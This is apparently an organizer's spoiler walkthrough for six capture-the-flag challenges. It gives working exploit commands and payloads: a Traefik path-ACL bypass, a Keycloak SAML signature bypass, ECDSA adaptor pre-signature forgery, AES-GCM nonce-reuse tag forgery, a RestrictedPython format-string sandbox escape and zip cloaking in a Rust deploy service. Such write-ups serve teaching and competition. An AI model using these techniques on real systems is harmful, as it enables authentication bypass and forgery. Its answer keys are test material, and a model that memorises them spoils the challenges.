# Solution walkthrough (organizer — SPOILERS)

`scripts/solve.py` performs all six end-to-end (needs only `ecdsa` for c3).

## c1 — Traefik URL.Opaque desync
The edge ACL runs on `req.URL.Path`; it forwards `req.URL.Opaque` verbatim. Go
stores a rootless target in `Opaque`, leaving `Path` empty:
```
printf 'GET http:admin/flag HTTP/1.1\r\nHost: c1\r\n\r\n' | nc <host> 8401
```
`Path=""` (ACL sees `/`, allowed) but `Opaque="admin/flag"` reaches the internal
`/admin/flag`. (`GET /admin/flag` is 403.) → **flag**

## c2 — Keycloak SAML redirect percent-name differential
The signature layer only engages for the *literal* name `SAMLResponse`; the
processor percent-decodes names and reads whatever decodes to `SAMLResponse`.
Send the response under an encoded name, unsigned:
```
curl "http://<host>:8402/saml/acs?%53AMLResponse=$(python3 -c '...urlencode(b64(admin_assertion))')"
```
The assertion's `<NameID>` is `admin@deepend.local`. → **flag**

## c3 — ECDSA adaptor-signature forgery
PreVerify checks `s_hat·K == H(m)·G + r·P` and `r == x(K_Y)`, but never binds
`K_Y` to the adaptor point `Y`. So forge with only `P`:
```
K_Y = a·G (any a) ; r = x(K_Y) mod n ; s_hat = 1 ; K = H(target)·G + r·P
POST /presign/verify {m: target, K, K_Y, r, s_hat}
```
`s_hat·K = K = H·G + r·P` ✓ and `r = x(K_Y)` ✓ — a pre-signature you could never
legitimately produce. → **flag**

## c4 — AES-GCM nonce reuse (forbidden attack)
Every message uses the same key+nonce. For single 16-byte blocks, with length
block `L = 0^64 ‖ 128`:  `T = C·H² ⊕ L·H ⊕ S`. Two ciphertexts give
`T1⊕T2 = (C1⊕C2)·H²`, so:
```
H² = (T1⊕T2) · (C1⊕C2)^-1 ;  H = sqrt(H²) = (H²)^(2^127)          # unique in GF(2^128)
S  = T1 ⊕ C1·H² ⊕ L·H
keystream = p1 ⊕ c1 ;  c* = TARGET ⊕ keystream ;  T* = c*·H² ⊕ L·H ⊕ S
POST /command {ct: c*, tag: T*}       # server AES-GCM-verifies the forged tag
```
→ **flag**  (`solve.py` ships the GF(2¹²⁸) multiply / inverse / sqrt.)

## c5 — RestrictedPython Formatter escape
`str.format` field resolution walks attributes with plain getattr, past the
sandbox's `safer_getattr`:
```
curl -d '{ctx.__class__.__init__.__globals__[FLAG]}' http://<host>:8405/render
```
`ctx.__class__.__init__` is a real function; `.__globals__[FLAG]` is the hidden
module global. → **flag**

## c6 — Rust zip2 "zip cloaking"
The deploy service validates **Central-Directory** names (allow-list:
`bundle.json`) but extracts by **Local-File-Header** names. Craft a zip whose CD
entry is `bundle.json` while its LFH writes `data/unlocked = "yes"` — the file
the extractor creates that the validator never saw:
```
POST /deploy  <cloaked.zip>     # CD name "bundle.json", LFH name "data/unlocked"
```
(An honest zip, or one whose CD name is `data/unlocked`, is rejected.) → **flag**
